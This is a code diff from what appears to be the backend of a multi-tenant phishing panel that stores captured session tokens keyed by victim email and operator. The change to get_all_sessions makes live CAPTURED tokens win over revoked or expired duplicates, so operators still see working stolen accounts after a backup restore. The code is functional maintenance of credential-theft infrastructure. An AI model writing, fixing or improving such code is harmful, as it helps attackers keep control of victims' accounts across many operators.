@@ -656,18 +656,35 @@ def get_all_sessions(owner_id=None, admin_only=False):
     finally:
         conn.close()
 
-    # De-duplicate sessions by (owner_id, victim_email) so one tenant's capture never silences another's
-    seen_keys = set()
+    # De-duplicate sessions by (owner_id, victim_email) so one tenant's capture
+    # never silences another's.
+    #
+    # A restored backup can leave two rows for the same person: the stale one
+    # that was already here and the restored one (suffixed user_code). Both can
+    # share a created_at, so ordering alone is not enough — a live CAPTURED row
+    # must always win over a REVOKED/EXPIRED duplicate, otherwise the dashboard
+    # shows a dead token and hides the working account.
+    _STATUS_RANK = {'CAPTURED': 0, 'REVOKED': 1, 'EXPIRED': 2, 'PENDING': 3}
+    best = {}
     deduped = []
     for s in raw_sessions:
         email = (s.get('victim_email') or '').strip().lower()
         owner = s.get('owner_id')
-        if email and email != 'unknown':
-            key = (owner, email)
-            if key in seen_keys:
-                continue
-            seen_keys.add(key)
-        deduped.append(s)
+        if not email or email == 'unknown':
+            deduped.append(s)
+            continue
+        key = (owner, email)
+        prev = best.get(key)
+        if prev is None:
+            best[key] = s
+            continue
+        # Keep whichever row is more useful: better status, then newer id.
+        if (_STATUS_RANK.get(s.get('status'), 9), -(s.get('id') or 0)) < \
+           (_STATUS_RANK.get(prev.get('status'), 9), -(prev.get('id') or 0)):
+            best[key] = s
+    deduped.extend(best.values())
+    # Preserve the caller's ORDER BY (created_at DESC).
+    deduped.sort(key=lambda s: s.get('created_at') or '', reverse=True)
     return deduped
 
 def get_captured_sessions():
